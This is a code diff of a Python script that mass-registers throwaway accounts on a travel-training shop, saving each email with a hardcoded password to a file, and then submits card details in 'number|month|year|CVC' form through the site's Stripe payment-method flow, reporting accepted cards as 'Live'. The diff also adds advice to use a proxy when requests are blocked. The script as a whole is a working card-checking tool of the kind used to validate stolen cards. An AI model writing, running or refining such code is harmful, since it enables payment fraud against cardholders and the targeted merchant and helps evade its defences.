@@ -10,9 +10,14 @@ import re
 import random
 import string
 from bs4 import BeautifulSoup
+import requests
+import re
+import random
+import string
+from bs4 import BeautifulSoup
 
 def generate_random_email(length=8, domain=None):
-    """Generates a random email address"""
+    """Generates a random email address."""
     common_domains = ["gmail.com", "yahoo.com", "outlook.com"]
     if not domain:
         domain = random.choice(common_domains)
@@ -20,16 +25,14 @@ def generate_random_email(length=8, domain=None):
     return f"{random_string}@{domain}"
 
 def create_session():
-    """Creates a session, registers an account, and saves credentials to a file"""
+    """Creates a session and registers an account."""
     try:
         session = requests.Session()
         email = generate_random_email()
         headers = {
-            'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Referer': 'https://www.thetravelinstitute.com/register/',
         }
 
         response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
@@ -40,16 +43,11 @@ def create_session():
         noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})
 
         if not nonce or not noncee:
-            print("Error: Nonce values not found on page.")
+            print("❌ Nonce values not found!")
             return None
 
         nonce = nonce['value']
         noncee = noncee['value']
-
-        headers.update({
-            'content-type': 'application/x-www-form-urlencoded',
-            'referer': 'https://www.thetravelinstitute.com/register/',
-        })
 
         data = {
             'afurd_field_nonce': nonce,
@@ -67,15 +65,15 @@ def create_session():
                 f.write(f'{email}:Esahatam2009@\n')
             return session
         else:
-            print("Error: Registration request failed.")
+            print("❌ Registration failed!")
             return None
 
     except requests.exceptions.RequestException as e:
-        print(f"Request error: {e}")
+        print(f"❌ Error in create_session: {e}")
         return None
 
 def Tele(ccx):
-    """Handles payment method addition by interacting with the Stripe API"""
+    """Handles payment method addition and Stripe API interaction."""
     ccx = ccx.strip()
 
     try:
@@ -84,16 +82,15 @@ def Tele(ccx):
             raise ValueError("Invalid input format. Expected format: CardNumber|Month|Year|CVC")
         n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
 
-        # Validate inputs
         if not (1 <= int(mm) <= 12):
             raise ValueError("Invalid month (must be 1-12).")
         if len(yy) == 4:
-            yy = yy[-2:]  # Convert YYYY to YY format
+            yy = yy[-2:]
         if len(cvc) not in [3, 4]:
             raise ValueError("Invalid CVC length (must be 3 or 4 digits).")
 
     except ValueError as e:
-        print(f"Error: {e} - Input: {ccx}")
+        print(f"❌ Error: {e} - Input: {ccx}")
         return None
 
     session = requests.Session()
@@ -101,9 +98,8 @@ def Tele(ccx):
     try:
         # Fetch nonce for payment method addition
         headers = {
-            'authority': 'www.thetravelinstitute.com',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'Referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
         }
 
         response = session.get(
@@ -117,17 +113,16 @@ def Tele(ccx):
         html = response.text
         nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
         if not nonce_match:
-            print("Error: Nonce not found on payment method page.")
+            print("❌ Error: Nonce not found on payment page.")
             return None
         nonce = nonce_match.group(1)
 
-        # Send request to Stripe API
+        # Stripe API request
         stripe_headers = {
-            'authority': 'api.stripe.com',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://js.stripe.com',
+            'Referer': 'https://js.stripe.com/',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
 
         stripe_data = {
@@ -165,18 +160,24 @@ def Tele(ccx):
             data=form_data,
             timeout=20
         )
+
+        if final_response.status_code == 403:
+            print("🚫 403 Forbidden: Your request was blocked. Try using a proxy or updating headers.")
+            return None
+
         final_response.raise_for_status()
         
-        return final_response.json().get('msg', 'Live')
+        return final_response.json().get('msg', '✅ Live')
 
     except requests.exceptions.RequestException as e:
-        print(f"Request failed: {e}")
+        print(f"❌ Request failed: {e}")
         return None
 
 # Example usage:
 # session = create_session()
 # if session:
-#     print("Session created successfully!")
+#     print("✅ Session created successfully!")
 
 # result = Tele("4242424242424242|12|2026|123")
 # print(result)
+
